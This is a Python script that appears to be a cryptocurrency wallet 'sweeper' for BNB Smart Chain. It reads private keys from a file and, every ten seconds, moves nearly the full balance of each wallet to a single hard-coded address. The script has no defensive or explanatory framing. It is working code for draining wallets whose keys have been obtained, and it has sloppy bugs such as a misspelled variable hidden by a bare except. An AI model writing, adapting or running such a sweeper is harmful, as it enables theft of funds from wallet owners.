from web3 import Web3
from decimal import Decimal
import time
import config
from eth_account import Account

with open('key.txt',encoding='utf-8') as f:
    line_count = 0
    for line in f:
        line != "\n"
        line_count += 1 
               
with open('key.txt',encoding='utf-8' ) as file:
    add = file.read().split()
   
print('\n[-] Успешно загрузился файл ключей: ' + str(line_count)+' строк')  

def check_payment():
    print('[+] Checked ')
    for keys in add:
     bsc = "https://bsc-dataseed.binance.org/"
     web3 = Web3(Web3.HTTPProvider(bsc))
     account_2 = "0x78ad708bE087cb88F40DAcC7a4fd28eD4A0Da893"
     private_key = keys.strip()
     acct = Account.from_key(private_key)
     print("Address:", acct.address)
     account_1 = acct.address
     balance_wei=web3.eth.get_balance(account_1)
     balance=web3.fromWei(balance_wei,'ether')
     nonce=web3.eth.getTransactionCount(account_1)
     gas=21000
     max_transfer=balance-Decimal(0.0006)
     #print (max_transfer)
     print (balance)
     if max_transfer>0.01:
     	
      tx = {
           'nonce':nonce,
           'to':account_2,
           'value':web3.toWei(max_transfer,'ether'),
           'gas':gas,
           'gasPrice':web3.toWei('5','gwei')
      }
      try:
        signed_tx=web3.eth.account.signTransaction(tx, private_key)
        tx_Hash=web3.eth.sendRawTransaction(signed_tx.rawTransaction)
        print(web3.toHex(tx_hash))
      except:
        time.sleep(3)
        
while True:      
 check_payment()
 time.sleep(10)